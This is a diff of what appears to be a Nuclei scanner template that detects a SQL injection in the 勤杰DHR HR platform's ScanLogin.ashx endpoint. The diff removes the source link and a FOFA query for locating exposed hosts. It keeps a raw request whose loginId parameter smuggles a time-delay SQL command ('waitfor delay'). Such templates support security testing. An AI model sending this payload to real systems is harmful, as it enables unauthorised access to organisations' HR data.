@@ -3,12 +3,8 @@ info:
   name: 勤杰DHR数智人力资源共享平台 ScanLogin.ashx SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ckgeh7rml3uppbor'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ckgeh7rml3uppbor
-    fofa: body="HandlerNoPri/ScanLogin.ashx"
 http:
 - raw:
   - GET /HandlerNoPri/ScanLogin.ashx?Action=GetCodeStatus&loginId=%27;waitfor%20delay%20%270:0:5%27-- HTTP/1.1
